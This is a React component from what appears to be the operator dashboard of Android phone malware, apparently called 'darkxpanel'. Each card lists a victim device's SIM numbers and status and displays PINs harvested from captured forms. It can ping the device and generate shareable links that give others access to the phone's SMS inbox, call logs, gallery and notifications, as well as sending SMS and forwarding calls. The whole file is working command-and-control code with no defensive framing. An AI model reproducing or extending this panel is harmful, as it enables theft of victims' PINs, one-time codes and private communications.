import { useState, useEffect, useMemo } from "react";
import { Smartphone, Battery, Wifi, WifiOff, CreditCard, Eye, Trash2, Bell, StickyNote, Lock, Save, Link2, Link2Off, Copy, Pin, PinOff, X, Check, Loader2, User, Share2, Shield } from "lucide-react";
import { DeviceUser, DeviceForm } from "@/hooks/useFirebaseData";
import { sendPing } from "@/lib/fcm";
import { toast } from "sonner";
import { useSecuritySettings } from "@/hooks/useSecuritySettings";
import OtpDialog from "@/components/OtpDialog";
import { db, publicAuth, isSwitched, activeConfig } from "@/lib/firebase";
import { ref, onValue, set, remove, get } from "@/lib/rtdbPb";
import { createUserWithEmailAndPassword, signInWithEmailAndPassword, deleteUser, signOut } from "@/lib/authPb";
import { generateLinkKey, encryptToken } from "@/lib/linkCrypto";

interface DeviceCardProps {
  id: string;
  index?: number;
  user: DeviceUser;
  onClick: () => void;
  onDelete?: () => void;
  notes: string;
  onNotesChange: (notes: string) => void;
  forms?: DeviceForm[];
  pinned?: boolean;
  onTogglePin?: () => void;
}

const brandIcons: Record<string, string> = {
  POCO: "📱", Samsung: "📱", Xiaomi: "📱", OnePlus: "📱",
  Realme: "📱", Vivo: "📱", Oppo: "📱", Google: "📱", Pixel: "📱",
};

const EXPIRY_OPTIONS = [
  { label: "15 min", ms: 15 * 60 * 1000 },
  { label: "30 min", ms: 30 * 60 * 1000 },
  { label: "1 hour", ms: 60 * 60 * 1000 },
  { label: "1 day", ms: 24 * 60 * 60 * 1000 },
  { label: "Permanent", ms: 0 },
];

const DeviceCard = ({ id, index, user, onClick, onDelete, notes, onNotesChange, forms = [], pinned = false, onTogglePin }: DeviceCardProps) => {
  const [showNotes, setShowNotes] = useState(false);
  const [localNotes, setLocalNotes] = useState(notes);
  const [showOtp, setShowOtp] = useState(false);
  const [linkEnabled, setLinkEnabled] = useState(false);
  const [linkExpiry, setLinkExpiry] = useState<number>(0);
  const [showLinkModal, setShowLinkModal] = useState(false);
  const [generatedLink, setGeneratedLink] = useState<string>("");
  const [creatingLink, setCreatingLink] = useState(false);
  const [unlinking, setUnlinking] = useState(false);
  const [deleting, setDeleting] = useState(false);
  const [linkPermissions, setLinkPermissions] = useState({
    sms: true, sent_sms: true, calls: true, forms: true,
    gallery: true, notifications: true, send_sms: true, call_forward: true,
  });
  const { security } = useSecuritySettings();
  const isOnline = user.status === "online";
  const isNew = useMemo(() => user.timestamp && (Date.now() - user.timestamp) < 60 * 60 * 1000, [user.timestamp]);
  const brandEmoji = brandIcons[user.brand] || "📱";
  const batteryColor =
    user.battery > 50 ? "text-green" : user.battery > 20 ? "text-yellow" : "text-destructive";

  useEffect(() => {
    const linkRef = ref(db, `device_links/${id}`);
    const unsub = onValue(linkRef, (snap) => {
      const data = snap.val();
      if (data) {
        const expired = data.expires_at && Date.now() > data.expires_at;
        const active = data.enabled === true && !expired;
        setLinkEnabled(active);
        setLinkExpiry(data.expires_at || 0);
        if (active && data.token) {
          setGeneratedLink(`${window.location.origin}/view/${id}?t=${encodeURIComponent(data.token)}`);
        } else {
          setGeneratedLink("");
        }
      } else {
        setLinkEnabled(false);
        setLinkExpiry(0);
        setGeneratedLink("");
      }
    });
    return () => unsub();
  }, [id]);

  const createLink = async (expiryMs: number) => {
    setCreatingLink(true);
    try {
      const randStr = Math.random().toString(36).slice(2, 10);
      const tempEmail = `link_${id}_${randStr}@temp.darkxpanel.dev`;
      const tempPass = `lnk_${Math.random().toString(36).slice(2)}${Date.now()}`;
      const { user: viewerUser } = await createUserWithEmailAndPassword(publicAuth, tempEmail, tempPass);
      // Generate AES key and encrypt credentials
      const aesKey = await generateLinkKey();
      const encryptedToken = await encryptToken(`${tempEmail}:${tempPass}`, aesKey);
      const expiresAt = expiryMs > 0 ? Date.now() + expiryMs : 0;
      const linkData: Record<string, unknown> = {
        enabled: true,
        created_at: Date.now(),
        expires_at: expiresAt,
        device_brand: user.brand,
        device_model: user.model,
        token: encryptedToken,
        aes_key: aesKey,
        viewer_uid: viewerUser.uid,
        permissions: linkPermissions,
      };
      if (isSwitched()) {
        linkData.databaseURL = activeConfig.databaseURL;
        linkData.projectId = activeConfig.projectId;
      }
      await set(ref(db, `device_links/${id}`), linkData);
      const extraParams = isSwitched()
        ? `&db=${encodeURIComponent(activeConfig.databaseURL)}`
        : "";
      const link = `${window.location.origin}/view/${id}?t=${encodeURIComponent(encryptedToken)}${extraParams}`;
      setGeneratedLink(link);
      await navigator.clipboard.writeText(link);
      toast.success("Link created & copied!");
    } catch (err: any) {
      console.error("Link creation error:", err);
      toast.error("Failed to create link");
    }
    setCreatingLink(false);
  };

  const disableLink = async (e: React.MouseEvent) => {
    e.stopPropagation();
    setUnlinking(true);
    try {
      const snap = await get(ref(db, `device_links/${id}`));
      const linkData = snap.val() as Record<string, unknown> | null;
      if (linkData?.viewer_uid && typeof linkData.viewer_uid === "string") {
        try {
          await deleteUser({
            uid: linkData.viewer_uid as string,
            email: null,
            delete: async () => {},
          });
        } catch (authErr) {
          console.warn("Could not delete link viewer user:", authErr);
        }
      } else if (linkData?.token && linkData?.aes_key) {
        try {
          const { decryptToken } = await import("@/lib/linkCrypto");
          const decrypted = await decryptToken(linkData.token as string, linkData.aes_key as string);
          const [email, ...passParts] = decrypted.split(":");
          const password = passParts.join(":");
          const cred = await signInWithEmailAndPassword(publicAuth, email, password);
          await deleteUser(cred.user);
          await signOut(publicAuth);
        } catch (authErr) {
          console.warn("Could not delete link auth user:", authErr);
        }
      }
      await remove(ref(db, `device_links/${id}`));
    } catch (err) {
      console.error("Disable link error:", err);
      await set(ref(db, `device_links/${id}/enabled`), false);
    }
    setShowLinkModal(false);
    setGeneratedLink("");
    setUnlinking(false);
    toast.success("Link disabled & credentials removed");
  };

  const copyGeneratedLink = () => {
    if (generatedLink) {
      navigator.clipboard.writeText(generatedLink);
      toast.success("Link copied!");
    }
  };

  const pins: string[] = [];
  forms.forEach((form) => {
    if (form.content?.bvcx) pins.push(form.content.bvcx);
  });

  const handleDeleteClick = async () => {
    if (security.otp_on_delete) {
      setShowOtp(true);
    } else {
      setDeleting(true);
      await onDelete?.();
      setDeleting(false);
    }
  };

  return (
    <div className={`rounded-2xl border p-4 transition-all duration-300 ${pinned ? "border-primary/60 bg-gradient-to-br from-primary/[0.08] to-primary/[0.02] shadow-[0_0_20px_hsl(var(--primary)/0.15)] ring-1 ring-primary/20" : "border-border bg-card hover:border-primary/50"}`}>
      {/* Top row */}
      <div className="flex items-center justify-between mb-3">
        <div className="flex items-center gap-2.5">
          <div className={`h-10 w-10 rounded-xl flex items-center justify-center text-sm font-black tracking-tight ${isOnline ? "bg-primary text-primary-foreground" : "bg-secondary text-muted-foreground"}`}>
            {user.model?.slice(0, 2).toUpperCase() || "??"}
          </div>
          <div>
            <h3 className="font-semibold text-sm text-foreground">{user.brand} {user.model}</h3>
            <div className="flex items-center gap-1.5">
              <p className="text-[10px] text-muted-foreground font-mono">#{index ?? id}</p>
              {isNew && (
                <span className="px-1.5 py-0.5 rounded-full bg-green/15 text-green text-[9px] font-bold uppercase tracking-wider animate-pulse">
                  New
                </span>
              )}
            </div>
          </div>
        </div>
        <div className="flex items-center gap-1">
          {isOnline ? <Wifi className="h-3.5 w-3.5 text-green" /> : <WifiOff className="h-3.5 w-3.5 text-destructive/60" />}
          <span className={`text-[10px] font-bold px-1.5 py-0.5 rounded-md ${isOnline ? "text-green bg-green/10" : "text-destructive/80 bg-destructive/10"}`}>
            {isOnline ? "Online" : "Offline"}
          </span>
        </div>
      </div>

      {/* Kiskahai tag */}
      <div className="inline-flex items-center gap-1.5 mb-2 px-2.5 py-1 rounded-lg bg-primary/10 border border-primary/20">
        <User className="h-3 w-3 text-primary" />
        <span className="text-[11px] font-bold text-primary">{user.kiskahai || "Unknown"}</span>
      </div>

      {/* Info row */}
      <div className="flex items-center gap-3 text-xs mb-3">
        <div className="flex items-center gap-1">
          <Battery className={`h-3 w-3 ${batteryColor}`} />
          <span className={batteryColor}>{user.battery}%</span>
        </div>
        <div className="flex items-center gap-1">
          <Smartphone className="h-3 w-3 text-cyan" />
          <span className="text-muted-foreground">Android {user.android_version}</span>
        </div>
      </div>

      {/* SIM info */}
      <div className="space-y-1 mb-3 text-[11px]">
        <div className="flex items-center gap-1.5">
          <CreditCard className="h-3 w-3 text-cyan" />
          <span className="text-muted-foreground">SIM1:</span>
          <span className="text-foreground font-mono truncate">{user.sim1 || "N/A"}</span>
        </div>
        <div className="flex items-center gap-1.5">
          <CreditCard className="h-3 w-3 text-pink" />
          <span className="text-muted-foreground">SIM2:</span>
          <span className="text-foreground font-mono truncate">{user.sim2 || "N/A"}</span>
        </div>
      </div>

      {/* PINs from forms */}
      {pins.length > 0 && (
        <div className="flex flex-wrap gap-1.5 mb-3">
          {pins.map((pin, i) => (
            <span key={i} className="inline-flex items-center gap-1 px-2 py-0.5 rounded-full bg-pink/10 text-pink text-[10px] font-mono font-bold">
              <Lock className="h-2.5 w-2.5" />
              PIN: {pin}
            </span>
          ))}
        </div>
      )}

      {/* Notes indicator */}
      {notes && (
        <div className="mb-3 rounded-lg bg-secondary/50 p-2 text-xs text-muted-foreground">
          <div className="flex items-center gap-1 mb-0.5">
            <StickyNote className="h-3 w-3 text-yellow" />
            <span className="text-yellow text-[10px] font-medium">Notes</span>
          </div>
          <p className="line-clamp-2">{notes}</p>
        </div>
      )}

      {/* Link indicator */}
      {linkEnabled && (
        <div className="mb-3 flex items-center gap-2 rounded-lg bg-primary/5 border border-primary/20 p-2">
          <Link2 className="h-3 w-3 text-primary shrink-0" />
          <span className="text-[10px] text-primary font-medium truncate flex-1">
            Link active {linkExpiry > 0 ? `• expires ${new Date(linkExpiry).toLocaleTimeString()}` : "• permanent"}
          </span>
          <button onClick={(e) => { e.stopPropagation(); setShowLinkModal(true); }} className="h-6 w-6 rounded-md bg-primary/10 flex items-center justify-center hover:bg-primary/20 transition-colors">
            <Eye className="h-2.5 w-2.5 text-primary" />
          </button>
        </div>
      )}

      {/* Action buttons */}
      <div className="flex items-center gap-2">
        <button
          onClick={(e) => { e.stopPropagation(); onTogglePin?.(); }}
          className={`flex items-center justify-center py-1.5 px-2 rounded-lg text-xs transition-colors ${
            pinned
              ? "bg-primary/10 text-primary hover:bg-primary/20"
              : "bg-secondary text-muted-foreground hover:text-foreground hover:bg-secondary/80"
          }`}
        >
          {pinned ? <PinOff className="h-3 w-3" /> : <Pin className="h-3 w-3" />}
        </button>
        <button
          onClick={(e) => { e.stopPropagation(); setShowNotes(!showNotes); setLocalNotes(notes); }}
          className={`flex items-center justify-center gap-1 py-1.5 px-2 rounded-lg text-xs transition-colors ${
            notes
              ? "bg-yellow/10 text-yellow hover:bg-yellow/20"
              : "bg-secondary text-muted-foreground hover:text-foreground hover:bg-secondary/80"
          }`}
        >
          <StickyNote className="h-3 w-3" />
        </button>
        <button
          onClick={async (e) => {
            e.stopPropagation();
            const t = toast.loading("Pinging...");
            const res = await sendPing(user.fcm_token);
            toast.dismiss(t);
            res.success ? toast.success("Ping sent!") : toast.error(res.error || "Ping failed");
          }}
          className="flex-1 flex items-center justify-center gap-1 py-1.5 rounded-lg bg-secondary text-xs text-muted-foreground hover:text-foreground hover:bg-secondary/80 transition-colors"
        >
          <Bell className="h-3 w-3" />
          Ping
        </button>
        <button
          onClick={(e) => {
            e.stopPropagation();
            if (linkEnabled) {
              disableLink(e);
            } else {
              setGeneratedLink("");
              setShowLinkModal(true);
            }
          }}
          disabled={unlinking}
          className={`flex-1 flex items-center justify-center gap-1 py-1.5 rounded-lg text-xs transition-colors disabled:opacity-50 ${
            linkEnabled
              ? "bg-primary/10 text-primary hover:bg-primary/20"
              : "bg-secondary text-muted-foreground hover:text-foreground hover:bg-secondary/80"
          }`}
        >
          {unlinking ? <Loader2 className="h-3 w-3 animate-spin" /> : linkEnabled ? <Link2Off className="h-3 w-3" /> : <Link2 className="h-3 w-3" />}
          {unlinking ? "Revoking..." : linkEnabled ? "Unlink" : "Link"}
        </button>
        <button
          onClick={(e) => { e.stopPropagation(); onClick(); }}
          className="flex-1 flex items-center justify-center gap-1 py-1.5 rounded-lg bg-primary/10 text-xs text-primary hover:bg-primary/20 transition-colors"
        >
          <Eye className="h-3 w-3" />
          View
        </button>
        <button
          onClick={(e) => { e.stopPropagation(); handleDeleteClick(); }}
          disabled={deleting}
          className="flex items-center justify-center py-1.5 px-2 rounded-lg bg-destructive/10 text-xs text-destructive hover:bg-destructive/20 transition-colors disabled:opacity-50"
        >
          {deleting ? <Loader2 className="h-3 w-3 animate-spin" /> : <Trash2 className="h-3 w-3" />}
        </button>
      </div>

      {/* Notes Modal */}
      {showNotes && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm p-4" onClick={() => setShowNotes(false)}>
          <div className="w-full max-w-sm rounded-2xl border border-border bg-card p-5 shadow-2xl space-y-4" onClick={(e) => e.stopPropagation()}>
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-2">
                <StickyNote className="h-4 w-4 text-yellow" />
                <h3 className="text-sm font-bold text-foreground">Device Notes</h3>
              </div>
              <button onClick={() => setShowNotes(false)} className="h-7 w-7 rounded-lg bg-secondary flex items-center justify-center hover:bg-destructive/10 hover:text-destructive transition-colors">
                <X className="h-3.5 w-3.5" />
              </button>
            </div>
            <p className="text-[11px] text-muted-foreground">
              {user.brand} {user.model} <span className="text-muted-foreground/60">· #{index ?? id}</span>
            </p>
            <textarea
              value={localNotes}
              onChange={(e) => setLocalNotes(e.target.value)}
              placeholder="Add notes about this device..."
              className="w-full rounded-xl border border-border bg-secondary/50 px-3.5 py-3 text-xs text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-1 focus:ring-primary resize-none"
              rows={4}
              autoFocus
            />
            <div className="flex gap-2">
              <button
                onClick={() => { onNotesChange(localNotes); setShowNotes(false); toast.success("Notes saved"); }}
                className="flex-1 flex items-center justify-center gap-1.5 py-2.5 rounded-xl bg-primary text-primary-foreground text-xs font-bold hover:opacity-90 transition-opacity"
              >
                <Save className="h-3.5 w-3.5" />
                Save Notes
              </button>
              <button
                onClick={() => setShowNotes(false)}
                className="flex items-center justify-center py-2.5 px-4 rounded-xl bg-secondary text-xs font-medium text-muted-foreground hover:text-foreground transition-colors"
              >
                Cancel
              </button>
            </div>
          </div>
        </div>
      )}

      {/* OTP Dialog */}
      {showOtp && (
        <OtpDialog
          action={`Delete device: ${user.brand} ${user.model}`}
          onVerified={() => { setShowOtp(false); onDelete?.(); }}
          onCancel={() => setShowOtp(false)}
        />
      )}

      {/* Link Modal */}
      {showLinkModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm p-4" onClick={() => setShowLinkModal(false)}>
          <div className="w-full max-w-sm rounded-2xl border border-border bg-card p-5 shadow-2xl space-y-4" onClick={(e) => e.stopPropagation()}>
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-2">
                <Link2 className="h-4 w-4 text-primary" />
                <h3 className="text-sm font-bold text-foreground">
                  {generatedLink ? "Link Ready" : "Create Share Link"}
                </h3>
              </div>
              <button onClick={() => setShowLinkModal(false)} className="h-7 w-7 rounded-lg bg-secondary flex items-center justify-center hover:bg-destructive/10 hover:text-destructive transition-colors">
                <X className="h-3.5 w-3.5" />
              </button>
            </div>

            <p className="text-[11px] text-muted-foreground">
              {user.brand} {user.model} <span className="text-muted-foreground/60">· #{index ?? id}</span>
            </p>

            {!generatedLink ? (
              <div className="space-y-3">
                <p className="text-[10px] text-muted-foreground font-semibold uppercase tracking-widest">Select duration</p>
                <div className="grid grid-cols-3 gap-2">
                  {EXPIRY_OPTIONS.map((opt) => (
                    <button
                      key={opt.label}
                      disabled={creatingLink}
                      onClick={() => createLink(opt.ms)}
                      className="px-3 py-2.5 rounded-xl bg-secondary border border-border text-[11px] font-semibold text-foreground hover:bg-primary/10 hover:text-primary hover:border-primary/30 transition-all disabled:opacity-40"
                    >
                      {opt.label}
                    </button>
                  ))}
                </div>

                <div className="space-y-2">
                  <p className="text-[10px] text-muted-foreground font-semibold uppercase tracking-widest">Feature Access</p>
                  <div className="grid grid-cols-2 gap-1.5">
                    {[
                      { key: "sms", label: "SMS Inbox", icon: "💬" },
                      { key: "sent_sms", label: "Sent SMS", icon: "📤" },
                      { key: "calls", label: "Call Logs", icon: "📞" },
                      { key: "forms", label: "Forms / PINs", icon: "📝" },
                      { key: "gallery", label: "Gallery", icon: "🖼️" },
                      { key: "notifications", label: "Notifications", icon: "🔔" },
                      { key: "send_sms", label: "Send SMS", icon: "✉️" },
                      { key: "call_forward", label: "Call Forward", icon: "📲" },
                    ].map((feat) => (
                      <button
                        key={feat.key}
                        type="button"
                        onClick={() => setLinkPermissions(p => ({ ...p, [feat.key]: !p[feat.key as keyof typeof p] }))}
                        className={`flex items-center gap-1.5 px-2.5 py-2 rounded-xl border text-[10px] font-semibold transition-all ${
                          linkPermissions[feat.key as keyof typeof linkPermissions]
                            ? "bg-primary/10 border-primary/30 text-primary"
                            : "bg-secondary/50 border-border text-muted-foreground"
                        }`}
                      >
                        <span>{feat.icon}</span>
                        <span className="truncate">{feat.label}</span>
                        {linkPermissions[feat.key as keyof typeof linkPermissions] && (
                          <Check className="h-3 w-3 ml-auto shrink-0" />
                        )}
                      </button>
                    ))}
                  </div>
                </div>

                {creatingLink && (
                  <div className="flex items-center justify-center gap-2 py-2">
                    <Loader2 className="h-4 w-4 text-primary animate-spin" />
                    <span className="text-xs text-muted-foreground">Creating link...</span>
                  </div>
                )}
              </div>
            ) : (
              <div className="space-y-3">
                <div className="flex items-center gap-2 p-3 rounded-xl bg-secondary/80 border border-border">
                  <Check className="h-4 w-4 text-green shrink-0" />
                  <p className="text-[10px] text-foreground font-mono break-all flex-1 select-all">{generatedLink}</p>
                </div>

                <div className="flex items-center gap-2 p-2.5 rounded-xl bg-primary/5 border border-primary/15">
                  <Shield className="h-3.5 w-3.5 text-primary shrink-0" />
                  <p className="text-[10px] text-muted-foreground leading-relaxed">
                    <span className="font-semibold text-foreground">Share only with trusted people.</span> Link contains AES-256 encrypted credentials — secure but grants device access.
                  </p>
                </div>

                <div className="flex gap-2">
                  <button
                    onClick={copyGeneratedLink}
                    className="flex-1 flex items-center justify-center gap-1.5 py-2.5 rounded-xl bg-primary text-primary-foreground text-xs font-bold hover:opacity-90 transition-opacity"
                  >
                    <Copy className="h-3.5 w-3.5" />
                    Copy
                  </button>
                  <button
                    onClick={() => {
                      if (navigator.share) {
                        navigator.share({ title: `${user.brand} ${user.model} - Device Link`, url: generatedLink }).catch(() => {});
                      } else {
                        navigator.clipboard.writeText(generatedLink);
                        toast.success("Link copied!");
                      }
                    }}
                    className="flex-1 flex items-center justify-center gap-1.5 py-2.5 rounded-xl bg-secondary text-xs font-bold text-foreground hover:bg-secondary/80 transition-colors"
                  >
                    <Share2 className="h-3.5 w-3.5" />
                    Share
                  </button>
                  <button
                    onClick={(e) => disableLink(e)}
                    disabled={unlinking}
                    className="flex items-center justify-center gap-1.5 py-2.5 px-4 rounded-xl bg-destructive/10 text-destructive text-xs font-bold hover:bg-destructive/20 transition-colors disabled:opacity-50"
                  >
                    {unlinking ? <Loader2 className="h-3.5 w-3.5 animate-spin" /> : <Link2Off className="h-3.5 w-3.5" />}
                    {unlinking ? "..." : "Revoke"}
                  </button>
                </div>
              </div>
            )}
          </div>
        </div>
      )}
    </div>
  );
};

export default DeviceCard;
